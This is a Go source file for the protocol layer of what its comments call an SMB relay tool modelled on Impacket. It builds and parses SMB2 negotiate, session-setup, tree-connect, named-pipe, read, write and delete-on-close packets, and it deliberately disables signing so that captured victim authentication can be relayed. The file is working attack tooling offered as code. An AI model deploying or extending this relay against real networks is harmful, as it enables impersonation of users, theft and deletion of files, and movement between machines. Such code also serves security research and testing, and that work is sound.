package relay

import (
	"encoding/binary"
	"fmt"
	"io"
	"net"
)

// SMB2 Commands
const (
	SMB2_NEGOTIATE      = 0x0000
	SMB2_SESSION_SETUP  = 0x0001
	SMB2_LOGOFF         = 0x0002
	SMB2_TREE_CONNECT   = 0x0003
	SMB2_TREE_DISCONNECT = 0x0004
	SMB2_CREATE         = 0x0005
	SMB2_CLOSE          = 0x0006
	SMB2_READ           = 0x0008
	SMB2_WRITE          = 0x0009
	SMB2_IOCTL          = 0x000B
)

// SMB2 Status codes
const (
	STATUS_SUCCESS                = 0x00000000
	STATUS_MORE_PROCESSING_REQUIRED = 0xC0000016
	STATUS_LOGON_FAILURE          = 0xC000006D
	STATUS_PENDING                = 0x00000103
	STATUS_BUFFER_OVERFLOW        = 0x80000005
)

// SMB2 Flags
const (
	SMB2_FLAGS_SERVER_TO_REDIR = 0x00000001
)

// SMB2 SecurityMode
const (
	SMB2_NEGOTIATE_SIGNING_ENABLED = 0x0001
)

// SMB2 Dialect
const (
	SMB2_DIALECT_WILDCARD = 0x02FF // Multi-protocol negotiate response (triggers SMB2 upgrade)
	SMB2_DIALECT_0202     = 0x0202
	SMB2_DIALECT_0210     = 0x0210
	SMB2_DIALECT_0300     = 0x0300
)

// IOCTL codes
const (
	FSCTL_PIPE_TRANSCEIVE = 0x0011C017
)

// SMB2 CREATE disposition
const (
	FILE_OPEN = 0x00000001
)

// SMB2 CREATE access
const (
	FILE_READ_DATA        = 0x00000001
	FILE_WRITE_DATA       = 0x00000002
	FILE_APPEND_DATA      = 0x00000004
	FILE_READ_EA          = 0x00000008
	FILE_WRITE_EA         = 0x00000010
	FILE_READ_ATTRIBUTES  = 0x00000080
	FILE_WRITE_ATTRIBUTES = 0x00000100
	DELETE                = 0x00010000
	SYNCHRONIZE           = 0x00100000
	GENERIC_READ          = 0x80000000
	GENERIC_WRITE         = 0x40000000
)

// SMB2 CREATE share access
const (
	FILE_SHARE_READ  = 0x00000001
	FILE_SHARE_WRITE = 0x00000002
)

// SMB2 CREATE options
const (
	FILE_NON_DIRECTORY_FILE = 0x00000040
	FILE_DELETE_ON_CLOSE    = 0x00001000
)

// SMB2 CREATE file attributes
const (
	FILE_ATTRIBUTE_NORMAL = 0x00000080
)

// SMB2 Header (64 bytes)
type SMB2Header struct {
	ProtocolID    [4]byte  // \xfeSMB
	StructureSize uint16   // 64
	CreditCharge  uint16
	Status        uint32
	Command       uint16
	CreditReqResp uint16
	Flags         uint32
	NextCommand   uint32
	MessageID     uint64
	Reserved      uint32
	TreeID        uint32
	SessionID     uint64
	Signature     [16]byte
}

func newSMB2Header(command uint16, flags uint32) SMB2Header {
	h := SMB2Header{
		StructureSize: 64,
		Command:       command,
		Flags:         flags,
		CreditReqResp: 1,
	}
	copy(h.ProtocolID[:], []byte{0xFE, 'S', 'M', 'B'})
	return h
}

func parseSMB2Header(data []byte) (*SMB2Header, error) {
	if len(data) < 64 {
		return nil, fmt.Errorf("data too short for SMB2 header: %d bytes", len(data))
	}
	h := &SMB2Header{}
	copy(h.ProtocolID[:], data[0:4])
	h.StructureSize = binary.LittleEndian.Uint16(data[4:6])
	h.CreditCharge = binary.LittleEndian.Uint16(data[6:8])
	h.Status = binary.LittleEndian.Uint32(data[8:12])
	h.Command = binary.LittleEndian.Uint16(data[12:14])
	h.CreditReqResp = binary.LittleEndian.Uint16(data[14:16])
	h.Flags = binary.LittleEndian.Uint32(data[16:20])
	h.NextCommand = binary.LittleEndian.Uint32(data[20:24])
	h.MessageID = binary.LittleEndian.Uint64(data[24:32])
	h.Reserved = binary.LittleEndian.Uint32(data[32:36])
	h.TreeID = binary.LittleEndian.Uint32(data[36:40])
	h.SessionID = binary.LittleEndian.Uint64(data[40:48])
	copy(h.Signature[:], data[48:64])
	return h, nil
}

func marshalSMB2Header(h *SMB2Header) []byte {
	buf := make([]byte, 64)
	copy(buf[0:4], h.ProtocolID[:])
	binary.LittleEndian.PutUint16(buf[4:6], h.StructureSize)
	binary.LittleEndian.PutUint16(buf[6:8], h.CreditCharge)
	binary.LittleEndian.PutUint32(buf[8:12], h.Status)
	binary.LittleEndian.PutUint16(buf[12:14], h.Command)
	binary.LittleEndian.PutUint16(buf[14:16], h.CreditReqResp)
	binary.LittleEndian.PutUint32(buf[16:20], h.Flags)
	binary.LittleEndian.PutUint32(buf[20:24], h.NextCommand)
	binary.LittleEndian.PutUint64(buf[24:32], h.MessageID)
	binary.LittleEndian.PutUint32(buf[32:36], h.Reserved)
	binary.LittleEndian.PutUint32(buf[36:40], h.TreeID)
	binary.LittleEndian.PutUint64(buf[40:48], h.SessionID)
	copy(buf[48:64], h.Signature[:])
	return buf
}

// buildNegotiateRequest builds an SMB2 NEGOTIATE request for relay.
// Offers dialects 0x0202, 0x0210, 0x0300 matching Impacket.
// SecurityMode is 0 (no signing) — critical for relay since we don't have the session key.
func buildNegotiateRequest(messageID uint64) []byte {
	h := newSMB2Header(SMB2_NEGOTIATE, 0)
	h.MessageID = messageID
	h.CreditCharge = 0
	h.CreditReqResp = 31

	// NEGOTIATE request body (36 bytes + 3 dialects × 2 bytes)
	body := make([]byte, 36+6)
	binary.LittleEndian.PutUint16(body[0:2], 36)  // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], 3)   // DialectCount
	binary.LittleEndian.PutUint16(body[4:6], 0)   // SecurityMode = 0 (no signing for relay)
	// Reserved (2 bytes) = 0
	// Capabilities (4 bytes) = 0
	// ClientGuid (16 bytes) = 0
	// ClientStartTime (8 bytes) = 0
	binary.LittleEndian.PutUint16(body[36:38], SMB2_DIALECT_0202) // Dialect 2.0.2
	binary.LittleEndian.PutUint16(body[38:40], SMB2_DIALECT_0210) // Dialect 2.1
	binary.LittleEndian.PutUint16(body[40:42], SMB2_DIALECT_0300) // Dialect 3.0

	return append(marshalSMB2Header(&h), body...)
}

// buildNegotiateResponse builds an SMB2 NEGOTIATE response
func buildNegotiateResponse(messageID uint64, serverGUID [16]byte, securityBuffer []byte) []byte {
	h := newSMB2Header(SMB2_NEGOTIATE, SMB2_FLAGS_SERVER_TO_REDIR)
	h.MessageID = messageID
	h.Status = STATUS_SUCCESS
	h.CreditReqResp = 1

	// NEGOTIATE response body (65 bytes + security buffer)
	bodySize := 64 + len(securityBuffer)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 65)       // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], SMB2_NEGOTIATE_SIGNING_ENABLED) // SecurityMode
	binary.LittleEndian.PutUint16(body[4:6], SMB2_DIALECT_0202) // DialectRevision
	// NegotiateContextCount (2 bytes) = 0
	copy(body[8:24], serverGUID[:])                     // ServerGuid
	// Capabilities (4 bytes at offset 24) = 0
	binary.LittleEndian.PutUint32(body[28:32], 65536)   // MaxTransactSize
	binary.LittleEndian.PutUint32(body[32:36], 65536)   // MaxReadSize
	binary.LittleEndian.PutUint32(body[36:40], 65536)   // MaxWriteSize
	// SystemTime (8 bytes at offset 40) = 0
	// ServerStartTime (8 bytes at offset 48) = 0
	secBufOffset := uint16(64 + 64)                     // Header(64) + body offset to SecurityBuffer
	binary.LittleEndian.PutUint16(body[56:58], secBufOffset) // SecurityBufferOffset
	binary.LittleEndian.PutUint16(body[58:60], uint16(len(securityBuffer))) // SecurityBufferLength
	// NegotiateContextOffset (4 bytes at offset 60) = 0
	copy(body[64:], securityBuffer)

	return append(marshalSMB2Header(&h), body...)
}

// buildNegotiateResponseWithDialect builds an SMB2 NEGOTIATE response with a specific dialect.
// Used for SMB1→SMB2 upgrade (dialect=0x02FF wildcard) and normal negotiation.
func buildNegotiateResponseWithDialect(messageID uint64, serverGUID [16]byte, securityBuffer []byte, dialect uint16) []byte {
	h := newSMB2Header(SMB2_NEGOTIATE, SMB2_FLAGS_SERVER_TO_REDIR)
	h.MessageID = messageID
	h.Status = STATUS_SUCCESS
	h.CreditReqResp = 1
	h.CreditCharge = 1

	// NEGOTIATE response body (65 bytes + security buffer)
	bodySize := 64 + len(securityBuffer)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 65)                          // StructureSize
	binary.LittleEndian.PutUint16(body[2:4], SMB2_NEGOTIATE_SIGNING_ENABLED) // SecurityMode
	binary.LittleEndian.PutUint16(body[4:6], dialect)                      // DialectRevision
	// NegotiateContextCount (2 bytes) = 0
	copy(body[8:24], serverGUID[:])                                        // ServerGuid
	binary.LittleEndian.PutUint32(body[24:28], 0x7)                       // Capabilities (DFS|Leasing|LargeMTU)
	binary.LittleEndian.PutUint32(body[28:32], 65536)                     // MaxTransactSize
	binary.LittleEndian.PutUint32(body[32:36], 65536)                     // MaxReadSize
	binary.LittleEndian.PutUint32(body[36:40], 65536)                     // MaxWriteSize
	// SystemTime (8 bytes at offset 40) = 0
	// ServerStartTime (8 bytes at offset 48) = 0
	secBufOffset := uint16(64 + 64)                                        // Header(64) + body offset to SecurityBuffer
	binary.LittleEndian.PutUint16(body[56:58], secBufOffset)              // SecurityBufferOffset
	binary.LittleEndian.PutUint16(body[58:60], uint16(len(securityBuffer))) // SecurityBufferLength
	// NegotiateContextOffset (4 bytes at offset 60) = 0
	copy(body[64:], securityBuffer)

	return append(marshalSMB2Header(&h), body...)
}

// buildSessionSetupResponse builds an SMB2 SESSION_SETUP response
func buildSessionSetupResponse(messageID uint64, sessionID uint64, status uint32, securityBuffer []byte) []byte {
	h := newSMB2Header(SMB2_SESSION_SETUP, SMB2_FLAGS_SERVER_TO_REDIR)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.Status = status
	h.CreditReqResp = 1

	// SESSION_SETUP response body (9 bytes + security buffer)
	bodySize := 8 + len(securityBuffer)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize
	// SessionFlags (2 bytes) = 0
	secBufOffset := uint16(64 + 8) // Header(64) + body fixed part
	binary.LittleEndian.PutUint16(body[4:6], secBufOffset) // SecurityBufferOffset
	binary.LittleEndian.PutUint16(body[6:8], uint16(len(securityBuffer))) // SecurityBufferLength
	copy(body[8:], securityBuffer)

	return append(marshalSMB2Header(&h), body...)
}

// buildSessionSetupRequest builds an SMB2 SESSION_SETUP request.
// SecurityMode is 0 (no signing) — matches Impacket relay behavior.
func buildSessionSetupRequest(messageID uint64, sessionID uint64, securityBuffer []byte) []byte {
	h := newSMB2Header(SMB2_SESSION_SETUP, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.CreditReqResp = 1

	// SESSION_SETUP request body (25 bytes + security buffer)
	bodySize := 24 + len(securityBuffer)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 25) // StructureSize
	// Flags (1 byte at offset 2) = 0
	body[3] = 0x00 // SecurityMode = 0 (no signing for relay)
	// Capabilities (4 bytes at offset 4) = 0
	// Channel (4 bytes at offset 8) = 0
	secBufOffset := uint16(64 + 24) // Header(64) + fixed body
	binary.LittleEndian.PutUint16(body[12:14], secBufOffset) // SecurityBufferOffset
	binary.LittleEndian.PutUint16(body[14:16], uint16(len(securityBuffer))) // SecurityBufferLength
	// PreviousSessionId (8 bytes at offset 16) = 0
	copy(body[24:], securityBuffer)

	return append(marshalSMB2Header(&h), body...)
}

// buildTreeConnectRequest builds an SMB2 TREE_CONNECT request
func buildTreeConnectRequest(messageID uint64, sessionID uint64, treeID uint32, path string) []byte {
	h := newSMB2Header(SMB2_TREE_CONNECT, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	// Encode path as UTF-16LE
	pathUTF16 := encodeUTF16LE(path)

	// TREE_CONNECT request body (9 bytes + path)
	bodySize := 8 + len(pathUTF16)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 9) // StructureSize
	// Reserved (2 bytes) = 0
	pathOffset := uint16(64 + 8) // Header(64) + fixed body
	binary.LittleEndian.PutUint16(body[4:6], pathOffset) // PathOffset
	binary.LittleEndian.PutUint16(body[6:8], uint16(len(pathUTF16))) // PathLength
	copy(body[8:], pathUTF16)

	return append(marshalSMB2Header(&h), body...)
}

// buildCreateRequest builds an SMB2 CREATE request for a named pipe
func buildCreateRequest(messageID uint64, sessionID uint64, treeID uint32, pipeName string) []byte {
	h := newSMB2Header(SMB2_CREATE, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	nameUTF16 := encodeUTF16LE(pipeName)

	// CREATE request body (57 bytes + name)
	bodySize := 56 + len(nameUTF16)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 57) // StructureSize
	// SecurityFlags (1 byte at offset 2) = 0
	// RequestedOplockLevel (1 byte at offset 3) = 0
	// ImpersonationLevel (4 bytes at offset 4) = Impersonation (2)
	binary.LittleEndian.PutUint32(body[4:8], 2)
	// SmbCreateFlags (8 bytes at offset 8) = 0
	// Reserved (8 bytes at offset 16) = 0
	// DesiredAccess (4 bytes at offset 24)
	desiredAccess := uint32(FILE_READ_DATA | FILE_WRITE_DATA | FILE_APPEND_DATA |
		FILE_READ_EA | FILE_WRITE_EA | FILE_READ_ATTRIBUTES | FILE_WRITE_ATTRIBUTES | SYNCHRONIZE)
	binary.LittleEndian.PutUint32(body[24:28], desiredAccess)
	// FileAttributes (4 bytes at offset 28) = 0
	// ShareAccess (4 bytes at offset 32)
	binary.LittleEndian.PutUint32(body[32:36], FILE_SHARE_READ|FILE_SHARE_WRITE)
	// CreateDisposition (4 bytes at offset 36) = FILE_OPEN
	binary.LittleEndian.PutUint32(body[36:40], FILE_OPEN)
	// CreateOptions (4 bytes at offset 40) = FILE_NON_DIRECTORY_FILE
	binary.LittleEndian.PutUint32(body[40:44], FILE_NON_DIRECTORY_FILE)
	// NameOffset (2 bytes at offset 44)
	nameOffset := uint16(64 + 56) // Header + fixed body
	binary.LittleEndian.PutUint16(body[44:46], nameOffset)
	// NameLength (2 bytes at offset 46)
	binary.LittleEndian.PutUint16(body[46:48], uint16(len(nameUTF16)))
	// CreateContextsOffset (4 bytes at offset 48) = 0
	// CreateContextsLength (4 bytes at offset 52) = 0
	copy(body[56:], nameUTF16)

	return append(marshalSMB2Header(&h), body...)
}

// buildCreateFileReadRequest builds an SMB2 CREATE request for reading a file
func buildCreateFileReadRequest(messageID uint64, sessionID uint64, treeID uint32, fileName string) []byte {
	h := newSMB2Header(SMB2_CREATE, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	nameUTF16 := encodeUTF16LE(fileName)

	// CREATE request body (57 bytes + name)
	bodySize := 56 + len(nameUTF16)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 57) // StructureSize
	// RequestedOplockLevel (1 byte at offset 3) = 0
	// ImpersonationLevel (4 bytes at offset 4) = Impersonation (2)
	binary.LittleEndian.PutUint32(body[4:8], 2)
	// DesiredAccess (4 bytes at offset 24)
	binary.LittleEndian.PutUint32(body[24:28], GENERIC_READ)
	// FileAttributes (4 bytes at offset 28)
	binary.LittleEndian.PutUint32(body[28:32], FILE_ATTRIBUTE_NORMAL)
	// ShareAccess (4 bytes at offset 32) = FILE_SHARE_READ
	binary.LittleEndian.PutUint32(body[32:36], FILE_SHARE_READ)
	// CreateDisposition (4 bytes at offset 36) = FILE_OPEN
	binary.LittleEndian.PutUint32(body[36:40], FILE_OPEN)
	// CreateOptions (4 bytes at offset 40) = FILE_NON_DIRECTORY_FILE
	binary.LittleEndian.PutUint32(body[40:44], FILE_NON_DIRECTORY_FILE)
	// NameOffset (2 bytes at offset 44)
	nameOffset := uint16(64 + 56) // Header + fixed body
	binary.LittleEndian.PutUint16(body[44:46], nameOffset)
	// NameLength (2 bytes at offset 46)
	binary.LittleEndian.PutUint16(body[46:48], uint16(len(nameUTF16)))
	copy(body[56:], nameUTF16)

	return append(marshalSMB2Header(&h), body...)
}

// buildCreateFileDeleteRequest builds an SMB2 CREATE request with DELETE_ON_CLOSE
func buildCreateFileDeleteRequest(messageID uint64, sessionID uint64, treeID uint32, fileName string) []byte {
	h := newSMB2Header(SMB2_CREATE, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	nameUTF16 := encodeUTF16LE(fileName)

	// CREATE request body (57 bytes + name)
	bodySize := 56 + len(nameUTF16)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 57) // StructureSize
	// ImpersonationLevel = Impersonation (2)
	binary.LittleEndian.PutUint32(body[4:8], 2)
	// DesiredAccess = DELETE | GENERIC_READ
	binary.LittleEndian.PutUint32(body[24:28], DELETE|GENERIC_READ)
	// FileAttributes
	binary.LittleEndian.PutUint32(body[28:32], FILE_ATTRIBUTE_NORMAL)
	// ShareAccess = FILE_SHARE_READ
	binary.LittleEndian.PutUint32(body[32:36], FILE_SHARE_READ)
	// CreateDisposition = FILE_OPEN
	binary.LittleEndian.PutUint32(body[36:40], FILE_OPEN)
	// CreateOptions = FILE_DELETE_ON_CLOSE | FILE_NON_DIRECTORY_FILE
	binary.LittleEndian.PutUint32(body[40:44], FILE_DELETE_ON_CLOSE|FILE_NON_DIRECTORY_FILE)
	// NameOffset
	nameOffset := uint16(64 + 56)
	binary.LittleEndian.PutUint16(body[44:46], nameOffset)
	// NameLength
	binary.LittleEndian.PutUint16(body[46:48], uint16(len(nameUTF16)))
	copy(body[56:], nameUTF16)

	return append(marshalSMB2Header(&h), body...)
}

// parseCreateResponseWithSize extracts the FileID and file size from a CREATE response
func parseCreateResponseWithSize(data []byte) ([16]byte, uint64, error) {
	var fileID [16]byte
	hdr, err := parseSMB2Header(data)
	if err != nil {
		return fileID, 0, err
	}
	if hdr.Status != STATUS_SUCCESS {
		return fileID, 0, fmt.Errorf("create failed: status=0x%08x", hdr.Status)
	}
	if len(data) < 64+88 {
		return fileID, 0, fmt.Errorf("create response too short")
	}
	body := data[64:]
	// EndOfFile at offset 48 in response body (8 bytes)
	endOfFile := binary.LittleEndian.Uint64(body[48:56])
	// FileId at offset 64 in response body
	copy(fileID[:], body[64:80])
	return fileID, endOfFile, nil
}

// buildIOCTLRequest builds an SMB2 IOCTL request (FSCTL_PIPE_TRANSCEIVE)
func buildIOCTLRequest(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte, input []byte, maxOutputResponse uint32) []byte {
	h := newSMB2Header(SMB2_IOCTL, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	// IOCTL request body (57 bytes + input)
	bodySize := 56 + len(input)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 57) // StructureSize
	// Reserved (2 bytes at offset 2) = 0
	binary.LittleEndian.PutUint32(body[4:8], FSCTL_PIPE_TRANSCEIVE) // CtlCode
	copy(body[8:24], fileID[:]) // FileId
	inputOffset := uint32(64 + 56) // Header + fixed body
	binary.LittleEndian.PutUint32(body[24:28], inputOffset) // InputOffset
	binary.LittleEndian.PutUint32(body[28:32], uint32(len(input))) // InputCount
	// MaxInputResponse (4 bytes at offset 32) = 0
	// OutputOffset (4 bytes at offset 36) = 0 (no output in request)
	// OutputCount (4 bytes at offset 40) = 0
	binary.LittleEndian.PutUint32(body[44:48], maxOutputResponse) // MaxOutputResponse
	// Flags (4 bytes at offset 48) = SMB2_0_IOCTL_IS_FSCTL (1)
	binary.LittleEndian.PutUint32(body[48:52], 1)
	// Reserved2 (4 bytes at offset 52) = 0
	copy(body[56:], input)

	return append(marshalSMB2Header(&h), body...)
}

// buildReadRequest builds an SMB2 READ request
func buildReadRequest(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte, length uint32) []byte {
	return buildReadRequestAt(messageID, sessionID, treeID, fileID, length, 0)
}

// buildReadRequestAt builds an SMB2 READ request at a given offset (for file download)
func buildReadRequestAt(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte, length uint32, offset uint64) []byte {
	h := newSMB2Header(SMB2_READ, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	// READ request body (49 bytes)
	body := make([]byte, 49)
	binary.LittleEndian.PutUint16(body[0:2], 49) // StructureSize
	// Padding (1 byte at offset 2) = 0x50
	body[2] = 0x50
	// Flags (1 byte at offset 3) = 0
	binary.LittleEndian.PutUint32(body[4:8], length) // Length
	binary.LittleEndian.PutUint64(body[8:16], offset) // Offset
	copy(body[16:32], fileID[:]) // FileId
	// MinimumCount (4 bytes at offset 32) = 0
	// Channel (4 bytes at offset 36) = 0
	// RemainingBytes (4 bytes at offset 40) = 0
	// ReadChannelInfoOffset (2 bytes at offset 44) = 0
	// ReadChannelInfoLength (2 bytes at offset 46) = 0
	// Buffer (1 byte at offset 48) = 0
	body[48] = 0x00

	return append(marshalSMB2Header(&h), body...)
}

// buildWriteRequest builds an SMB2 WRITE request
func buildWriteRequest(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte, data []byte) []byte {
	h := newSMB2Header(SMB2_WRITE, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	// WRITE request body (49 bytes + data)
	bodySize := 48 + len(data)
	body := make([]byte, bodySize)
	binary.LittleEndian.PutUint16(body[0:2], 49) // StructureSize
	dataOffset := uint16(64 + 48) // Header + fixed body
	binary.LittleEndian.PutUint16(body[2:4], dataOffset) // DataOffset
	binary.LittleEndian.PutUint32(body[4:8], uint32(len(data))) // Length
	// Offset (8 bytes at offset 8) = 0
	copy(body[16:32], fileID[:]) // FileId
	// Channel (4 bytes at offset 32) = 0
	// RemainingBytes (4 bytes at offset 36) = 0
	// WriteChannelInfoOffset (2 bytes at offset 40) = 0
	// WriteChannelInfoLength (2 bytes at offset 42) = 0
	// Flags (4 bytes at offset 44) = 0
	copy(body[48:], data)

	return append(marshalSMB2Header(&h), body...)
}

// buildCloseRequest builds an SMB2 CLOSE request
func buildCloseRequest(messageID uint64, sessionID uint64, treeID uint32, fileID [16]byte) []byte {
	h := newSMB2Header(SMB2_CLOSE, 0)
	h.MessageID = messageID
	h.SessionID = sessionID
	h.TreeID = treeID

	// CLOSE request body (24 bytes)
	body := make([]byte, 24)
	binary.LittleEndian.PutUint16(body[0:2], 24) // StructureSize
	// Flags (2 bytes at offset 2) = 0
	// Reserved (4 bytes at offset 4) = 0
	copy(body[8:24], fileID[:]) // FileId

	return append(marshalSMB2Header(&h), body...)
}

// parseSessionSetupRequest parses the security buffer from a SESSION_SETUP request
func parseSessionSetupRequest(data []byte) ([]byte, error) {
	if len(data) < 64+24 {
		return nil, fmt.Errorf("session setup request too short")
	}
	body := data[64:]
	secBufOffset := binary.LittleEndian.Uint16(body[12:14])
	secBufLen := binary.LittleEndian.Uint16(body[14:16])
	// SecurityBufferOffset is from the beginning of the packet
	start := int(secBufOffset)
	if start+int(secBufLen) > len(data) {
		return nil, fmt.Errorf("security buffer extends beyond packet")
	}
	return data[start : start+int(secBufLen)], nil
}

// parseNegotiateRequest validates an SMB2 NEGOTIATE request
func parseNegotiateRequest(data []byte) error {
	if len(data) < 64+36 {
		return fmt.Errorf("negotiate request too short")
	}
	return nil
}

// parseSessionSetupResponse extracts security buffer and status from SESSION_SETUP response
func parseSessionSetupResponse(data []byte) (uint32, uint64, []byte, error) {
	hdr, err := parseSMB2Header(data)
	if err != nil {
		return 0, 0, nil, err
	}
	if len(data) < 64+8 {
		return 0, 0, nil, fmt.Errorf("session setup response too short")
	}
	body := data[64:]
	secBufOffset := binary.LittleEndian.Uint16(body[4:6])
	secBufLen := binary.LittleEndian.Uint16(body[6:8])
	if secBufLen == 0 {
		return hdr.Status, hdr.SessionID, nil, nil
	}
	start := int(secBufOffset)
	if start+int(secBufLen) > len(data) {
		return 0, 0, nil, fmt.Errorf("security buffer extends beyond response")
	}
	return hdr.Status, hdr.SessionID, data[start : start+int(secBufLen)], nil
}

// parseNegotiateResponse extracts dialect and security buffer from NEGOTIATE response
func parseNegotiateResponse(data []byte) (uint16, []byte, error) {
	if len(data) < 64+64 {
		return 0, nil, fmt.Errorf("negotiate response too short")
	}
	body := data[64:]
	dialect := binary.LittleEndian.Uint16(body[4:6])
	secBufOffset := binary.LittleEndian.Uint16(body[56:58])
	secBufLen := binary.LittleEndian.Uint16(body[58:60])
	if secBufLen == 0 {
		return dialect, nil, nil
	}
	start := int(secBufOffset)
	if start+int(secBufLen) > len(data) {
		return 0, nil, fmt.Errorf("security buffer extends beyond response")
	}
	return dialect, data[start : start+int(secBufLen)], nil
}

// parseTreeConnectResponse extracts the TreeID from a TREE_CONNECT response
func parseTreeConnectResponse(data []byte) (uint32, error) {
	hdr, err := parseSMB2Header(data)
	if err != nil {
		return 0, err
	}
	if hdr.Status != STATUS_SUCCESS {
		return 0, fmt.Errorf("tree connect failed: status=0x%08x", hdr.Status)
	}
	return hdr.TreeID, nil
}

// parseCreateResponse extracts the FileID from a CREATE response
func parseCreateResponse(data []byte) ([16]byte, error) {
	var fileID [16]byte
	hdr, err := parseSMB2Header(data)
	if err != nil {
		return fileID, err
	}
	if hdr.Status != STATUS_SUCCESS {
		return fileID, fmt.Errorf("create failed: status=0x%08x", hdr.Status)
	}
	if len(data) < 64+88 {
		return fileID, fmt.Errorf("create response too short")
	}
	body := data[64:]
	copy(fileID[:], body[64:80]) // FileId at offset 64 in response body
	return fileID, nil
}

// parseIOCTLResponse extracts the output data from an IOCTL response
func parseIOCTLResponse(data []byte) ([]byte, error) {
	hdr, err := parseSMB2Header(data)
	if err != nil {
		return nil, err
	}
	if hdr.Status != STATUS_SUCCESS && hdr.Status != STATUS_BUFFER_OVERFLOW {
		return nil, fmt.Errorf("ioctl failed: status=0x%08x", hdr.Status)
	}
	if len(data) < 64+48 {
		return nil, fmt.Errorf("ioctl response too short")
	}
	body := data[64:]
	outputOffset := binary.LittleEndian.Uint32(body[36:40])
	outputCount := binary.LittleEndian.Uint32(body[40:44])
	if outputCount == 0 {
		return nil, nil
	}
	start := int(outputOffset)
	if start+int(outputCount) > len(data) {
		return nil, fmt.Errorf("ioctl output extends beyond response")
	}
	return data[start : start+int(outputCount)], nil
}

// parseReadResponse extracts data from a READ response
func parseReadResponse(data []byte) ([]byte, error) {
	hdr, err := parseSMB2Header(data)
	if err != nil {
		return nil, err
	}
	if hdr.Status != STATUS_SUCCESS && hdr.Status != STATUS_BUFFER_OVERFLOW {
		return nil, fmt.Errorf("read failed: status=0x%08x", hdr.Status)
	}
	if len(data) < 64+16 {
		return nil, fmt.Errorf("read response too short")
	}
	body := data[64:]
	dataOffset := body[2]
	dataLength := binary.LittleEndian.Uint32(body[4:8])
	if dataLength == 0 {
		return nil, nil
	}
	start := int(dataOffset)
	if start+int(dataLength) > len(data) {
		return nil, fmt.Errorf("read data extends beyond response")
	}
	return data[start : start+int(dataLength)], nil
}

// sendPacket writes a 4-byte big-endian length prefix followed by the packet
func sendPacket(conn net.Conn, pkt []byte) error {
	lenBuf := make([]byte, 4)
	binary.BigEndian.PutUint32(lenBuf, uint32(len(pkt)))
	if _, err := conn.Write(lenBuf); err != nil {
		return err
	}
	_, err := conn.Write(pkt)
	return err
}

// recvPacket reads a 4-byte big-endian length prefix, then reads that many bytes
func recvPacket(conn net.Conn) ([]byte, error) {
	lenBuf := make([]byte, 4)
	if _, err := io.ReadFull(conn, lenBuf); err != nil {
		return nil, err
	}
	pktLen := binary.BigEndian.Uint32(lenBuf)
	if pktLen > 1<<20 { // 1MB sanity check
		return nil, fmt.Errorf("packet too large: %d bytes", pktLen)
	}
	pkt := make([]byte, pktLen)
	if _, err := io.ReadFull(conn, pkt); err != nil {
		return nil, err
	}
	return pkt, nil
}

// encodeUTF16LE encodes a string to UTF-16LE bytes
func encodeUTF16LE(s string) []byte {
	runes := []rune(s)
	buf := make([]byte, len(runes)*2)
	for i, r := range runes {
		binary.LittleEndian.PutUint16(buf[i*2:], uint16(r))
	}
	return buf
}
